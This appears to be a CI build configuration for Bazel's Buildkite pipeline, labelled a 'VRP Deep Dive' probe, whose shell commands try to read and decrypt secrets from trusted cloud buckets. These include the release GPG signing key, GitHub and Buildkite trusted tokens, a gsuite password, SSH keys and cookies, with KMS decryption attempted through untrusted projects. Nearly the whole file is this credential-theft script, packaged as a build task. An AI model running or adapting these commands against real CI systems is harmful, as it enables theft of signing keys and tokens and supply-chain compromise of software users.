---
tasks:
  vrp_deep_dive:
    name: "VRP Deep Dive"
    platform: ubuntu2204
    shell_commands:
      - "set +e"
      - "echo === Round 11: Trusted Secrets Deep Dive ==="
      - "echo"
      - "echo === 1. Read gsuite-username UNENCRYPTED ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/gsuite-username 2>&1 || true"
      - "echo"
      - "echo === 2. Read release-key.gpg.id UNENCRYPTED ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/release-key.gpg.id 2>&1 || true"
      - "echo"
      - "echo === 3. Read testing-release-key.gpg.id UNENCRYPTED ==="
      - "gsutil cat gs://bazel-testing-encrypted-secrets/testing-release-key.gpg.id 2>&1 || true"
      - "echo"
      - "echo === 4. List trusted secrets RECURSIVE ==="
      - "gsutil ls -r gs://bazel-trusted-encrypted-secrets/ 2>&1 || true"
      - "echo"
      - "echo === 5. List testing secrets RECURSIVE ==="
      - "gsutil ls -r gs://bazel-testing-encrypted-secrets/ 2>&1 || true"
      - "echo"
      - "echo === 6. Read gsuite-password.enc hex ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/gsuite-password.enc 2>&1 | xxd | head -10 || true"
      - "echo"
      - "echo === 7. Read github-trusted-token.enc hex ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/github-trusted-token.enc 2>&1 | xxd | head -10 || true"
      - "echo"
      - "echo === 8. Read release-key.gpg.enc hex ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/release-key.gpg.enc 2>&1 | xxd | head -20 || true"
      - "echo"
      - "echo === 9. KMS decrypt release-key via bazel-untrusted ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/release-key.gpg.enc 2>&1 | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key release-key --ciphertext-file - --plaintext-file - --quiet 2>&1 | head -5 || true"
      - "echo"
      - "echo === 10. KMS decrypt release-key via bazel-public ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/release-key.gpg.enc 2>&1 | gcloud kms decrypt --project bazel-public --location global --keyring buildkite --key release-key --ciphertext-file - --plaintext-file - --quiet 2>&1 | head -5 || true"
      - "echo"
      - "echo === 11. KMS decrypt github-trusted-token via bazel-untrusted ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/github-trusted-token.enc 2>&1 | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key github-trusted-token --ciphertext-file - --plaintext-file - --quiet 2>&1 | head -5 || true"
      - "echo"
      - "echo === 12. KMS decrypt gsuite-password via bazel-untrusted ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/gsuite-password.enc 2>&1 | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key gsuite-password --ciphertext-file - --plaintext-file - --quiet 2>&1 | head -5 || true"
      - "echo"
      - "echo === 13. List KMS keyrings in bazel-public ==="
      - "gcloud kms keyrings list --project bazel-public --location global --quiet 2>&1 || true"
      - "echo"
      - "echo === 14. List KMS keys in bazel-public buildkite keyring ==="
      - "gcloud kms keys list --project bazel-public --location global --keyring buildkite --quiet 2>&1 || true"
      - "echo"
      - "echo === 15. Read choco-trusted-token.enc hex ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/choco-trusted-token.enc 2>&1 | xxd | head -5 || true"
      - "echo"
      - "echo === 16. Read gitsync-cookies.enc hex ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/gitsync-cookies.enc 2>&1 | xxd | head -5 || true"
      - "echo"
      - "echo === 17. Read gitsync-ssh.enc hex ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/gitsync-ssh.enc 2>&1 | xxd | head -5 || true"
      - "echo"
      - "echo === 18. Try reading buildkite-trusted-agent-token plaintext ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/buildkite-trusted-agent-token 2>&1 || true"
      - "echo"
      - "echo === 19. Try reading buildkite-trusted-api-token plaintext ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/buildkite-trusted-api-token 2>&1 || true"
      - "echo"
      - "echo === 20. KMS decrypt trusted agent token via bazel-untrusted ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/buildkite-trusted-agent-token.enc 2>&1 | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key buildkite-trusted-agent-token --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo"
      - "echo === 21. KMS decrypt trusted API token via bazel-untrusted ==="
      - "gsutil cat gs://bazel-trusted-encrypted-secrets/buildkite-trusted-api-token.enc 2>&1 | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key buildkite-trusted-api-token --ciphertext-file - --plaintext-file - --quiet 2>&1 || true"
      - "echo === DONE ==="
    build_targets:
      - "//..."
